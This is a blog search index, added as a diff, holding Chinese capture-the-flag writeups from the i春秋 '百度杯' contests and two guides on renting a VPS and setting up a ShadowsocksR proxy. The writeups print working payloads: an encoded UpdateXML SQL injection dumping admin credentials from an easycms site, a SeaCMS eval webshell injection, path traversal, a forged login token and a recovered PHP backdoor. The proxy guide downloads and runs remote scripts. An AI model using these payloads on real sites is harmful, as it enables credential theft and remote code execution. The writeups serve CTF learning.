@@ -1,0 +1,59 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title><![CDATA[i春秋 "百度杯" 九月场 123 writeup]]></title>
+    <url>%2F2018%2F05%2F28%2F123%2F</url>
+    <content type="text"><![CDATA[打开是个登陆界面： 查看一下源代码： 用户信息都在user.php里，密码的结构也告诉你了，猜想是爆破但是现在没有字典，我们先访问一下user.php，发现啥都没有，一开始以为是文件包含，但是没有变量可以用可能是备份文件获取，试试user.php.bak果然： 将文件下载下来之后发现是用户名的信息，打开burpsuite开始爆破：从1990年开始（大佬们wp写的，我也不知道为什么） 字典直接用刚刚的user.php 开始爆破： 得到了一个用户lixiuyun 密码 lixiuyun1990 登陆进去之后也是什么都没有，查看源代码： 本地构建html： php别名：php2, php3, php4, php5, phps, pht, phtm, phtml …都可以试试: 可以看到有个view.php了，打开看看这次估计真是文件包含了： 这里还有个过滤，将flag过滤了双写flag即可拿到flag：]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[i春秋 "百度杯" 九月场 Yeser writeup]]></title>
+    <url>%2F2018%2F05%2F28%2FYeserCMS%2F</url>
+    <content type="text"><![CDATA[打开来是一个不知道什么cms的页面： 上cms指纹识别： 但是貌似识别不出来，想想其他方法比如搜一搜传递的变量名，也就是URL后面跟着的一大堆东西 点进去看了看，跟题目的cms差不多差不多确定是easycms了，搜一搜easycms漏洞但是找到的大多数不能用，最终还是看了大佬们写的writeup在URL/celive/live/header.php处有一个xpath注入漏洞xpath注入科普payload：第一段： xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt; &lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C1%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt; 第二段： xajax=Postdata&amp;xajaxargs[0]=&lt;xjxquery&gt; &lt;q&gt;detail=xxxxxx%2527%252C%2528UpdateXML%25281%252CCONCAT%25280x5b%252Cmid%2528%2528SELECT%252f%252a%252a%252fGROUP_CONCAT%2528concat %2528username%252C%2527%257C%2527%252Cpassword %2529%2529%2520from%2520yesercms_user %2529%252C10%252C32%2529%252C0x5d %2529%252C1%2529%2529%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%252CNULL%2529--%2520&lt;/q&gt;&lt;/xjxquery&gt; 这里得分成两段显示： 得到管理员的账户是admin密码是md5加密的Yeser231 登陆后台： 找地方上传shell，自己找了很久没有找到地方，最后还是看的大佬的wp在模版-&gt;当前模版编辑处 点击编辑，这个时候会把这个文件名传进去，然后再显示出来这个文件的内容： 这个时候直接看到提示：flag在网站根目录下的flag.php中把id换成../../flag.php即可得到flag:]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[i春秋 "百度杯" 九月场 Test writeup]]></title>
+    <url>%2F2018%2F05%2F28%2Ftest%2F</url>
+    <content type="text"><![CDATA[首先打开题目： 发现是一个海洋CMS，但是不太清楚版本往下翻一翻，发现有个年份 看得出是一个很老的版本了，题目的提示是：善于查资料，你就可以拿一血了好吧直接查资料：海洋cms漏洞利用 直接一大块的漏洞出来了。这里直接找到payload了：/search.php?searchtype=5&amp;tid=&amp;area=eval($_POST[cmd]) 然后打开菜刀：密码cmd连接即可： 连接成功： 可以发现在html/data下有个common.inc.php 这个是数据库的配置文件 菜刀连接数据库拿到flag:]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Centos6&7 搭建ssr科学上网及IPv6免流]]></title>
+    <url>%2F2018%2F05%2F27%2Fssr%2F</url>
+    <content type="text"><![CDATA[1.购买vps这里给出链接，就不仔细介绍了 2.搭建ssr连接上xshell或者其他shell软件之后，复制以下命令：wget -N https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.shchmod +x ssr.shbash ssr.sh一条一条命令执行即可，执行完之后看到的是这个页面： 选择1安装ssr，将端口号设置成443，密码写个自己能记住的密码： 加密方式选择10. aes-256-cfb 协议插件和混淆插件分别选择：2.auth_sha1_v4和tls1.2_ticket_auth 询问是否兼容原版，原版就是ss，这里选择no，选择yes的话就能支持ss客户端了： 限制的设备数、单线程限速上限、每个端口的总速度，这里都直接回车，选择默认（不限速）：(这里自用，所以没有限速和限流) 回车之后就可以开始安装了： 出来这个页面的话，证明已经安装完成了，如果嫌麻烦的话，这样已经可以直接用了，但是如果你想多端口配置也是可以的,输入:bash ssr.sh进入ssr的管理页面, 如果之前的步骤有些小问题的话这里也是可以修改的，现在我们需要切换成多端口模式： 配置跟之前的单端口一样就行，设置成功后： 直接就有一个端口，这个端口是之前单端口设置的，进入管理页面： 多端口模式下7.用户配置可以添加新的端口： 操作跟之前一样，配置成功后： 3.客户端的安装Windows：https://nofile.io/f/6Jm7WJCyOVv/ShadowsocksR-4.7.0-win.7z安卓：https://nofile.io/f/rvTJoj0h5GC/shadowsocksr-release.apk windows版解压完之后直接运行： 任务栏会出现一个小飞机：首先我们把前面ssr的链接复制下来，然后右键小飞机，选择剪贴板导入即可。 安卓的比较简单，就不仔细截图了。首先将APK安装-&gt;然后点击顶上方的“▼”-&gt;选择右下方的“+”-&gt;从剪切板导入即可(同样得复制之前的ssr链接) 4.bbr加速这一步主要是给自己的ssr提速复制以下命令到shell里: yum -y install wget wget --no-check-certificate https://github.com/teddysun/across/raw/master/bbr.sh chmod +x bbr.sh ./bbr.sh 安装完之后会提示你是否重启，选择y然后就能正常使用了。]]></content>
+      <tags>
+        <tag>技术分享</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[VPS的选择及购买]]></title>
+    <url>%2F2018%2F05%2F27%2Fvps%2F</url>
+    <content type="text"><![CDATA[这里主要讲述Vutrl的使用，搬瓦工也是可以的（因为都支持支付宝，简单快捷） 注册Vultr打开注册链接点击右上方的Create Account注册比较简单，输入邮箱密码创建就行进入邮箱确认，登陆后： 充值点击Billing,然后点击Make Payment下的Alipay 选择价格然后充值，第一次使用少充点，10美元就行觉得好用再继续充值就行，然后会跳转到支付宝的支付页面，用支付宝付款即可 添加服务器点击左侧的Servers可以看到右边有个“+”号：点击之后，这个页面是选择地区 在国内的话最好选择日本的服务器速度最快可以选择其他地区的比如纽约，洛杉矶，速度也不慢 选择系统类型，这里选择centos6，因为centos7的防火墙可能会导致ssr的一些服务不能用价格选择，当然是越贵越好了，但是这个好只是体现在连接的人数个人用的话选择最便宜的就行了。下方勾选Enable IPv6，需要IPv6免流的可以勾上 然后直接Deploy Now即可 这里附上一种测速方法： 使用ping命令： vutrl一开始最多可以创建5个VPS 创建完之后拿ping命令去试试速度 win+r 输入cmd 在控制台输入：ping 你的服务器IP 看看延迟就行，延迟越低速度越快 如果速度很慢的话把这个服务器删掉就行（创建5分钟之内不能消除） 连接服务器回到Servers页面点击刚刚创建的服务器这里的IP和密码待会得用到 这里有服务器的ssh我们需要使用shell软件来连接他这里演示的是xshell：从网上直接下载xshell就可以使用： 点击文件，新建 名称随便写个就行，主机处填写你服务器的IP然后点击左边的用户身份验证 用户名写root，密码从刚刚那个页面复制下来，然后点击连接就行出现这个页面就代表连接成功了:]]></content>
+      <tags>
+        <tag>技术分享</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[i春秋 “百度杯”login Writeup]]></title>
+    <url>%2F2018%2F05%2F26%2Flogin%2F</url>
+    <content type="text"><![CDATA[首先打开来是一个登陆的页面： 看看源码有没有什么提示： 可以看到最后面注释了两个test1 我们拿test1登陆进去试试： 登陆成功。左右看看没有什么发现。打开burpsuite抓包试试: 可以看到响应包有show这个参数，并且等于0我们将show这个参数等于1发送试试: 发送之后果然出现了一段代码： 这段代码的大概意思是： 当$login['user']='ichunqiu'的时候，echo flag 但是login只能从token中获得，并且被几个函数加密了， 我们只需要照着过程逆回去即可 payload： $arr = array('user'=>'ichunqiu'); $hello = base64_encode(gzcompress(serialize('$arr'))); echo $hello; 直接解析之后echo的值就是我们需要的token值,这里解密之后是这个： eJxLtDK0qi62MrFSKi1OLVKyLraysFLKTM4ozSvMLFWyrgUAo4oKXA== 将token放到cookie里发送即可得到flag:]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[i春秋"百度杯" 十月份Backdoor Write up]]></title>
+    <url>%2F2018%2F05%2F26%2FBackdoor%2F</url>
+    <content type="text"><![CDATA[春秋”百度杯” 十月份Backdoor Write up 首先题目提示: 敏感文件泄露 .git泄露： 使用githack将网站源码下载下来： 目录下有： 但是都是没有用的信息： 访问： .git/logs/refs/heads/master 猜想是还原版本： git checkout 734d08 然后再看看： 果然是，多试几个之后就出来一个不一样的flag文件： 访问b4ckdo0r.php： 其他地方没给什么提示，就试试有没有swp/swo文件：swp文件是vim编辑器不正常退出时产生的文件 URL/.b4ckdo0r.php.swp 或者 URL/.b4ckdo0r.php.swo 然后可以知道swp文件没有，但是`swo`文件存在 下载下来之后将后缀名`swo更改为swp` 在`linux`下进行还原 这里附上还原方法： 在linux下 假设你的swp文件叫'.index.php.swp' 可用带-r参数编辑 #vi -r index.php 然后wq保存即可 或者使用: #vi .index.php.swp 然后:recover 最后wq保存 还原出来之后是: php混淆加密，给出python脚本，参考链接将其中的URL换成题目的URL就行： 执行： python 保存的脚本名字.py b4ckdo0r.php 可以看到phpshell 执行 system('ls'); 查看即可得到flag: system('cat this_i5_flag.php');]]></content>
+      <tags>
+        <tag>writeup</tag>
+      </tags>
+  </entry>
+</search>
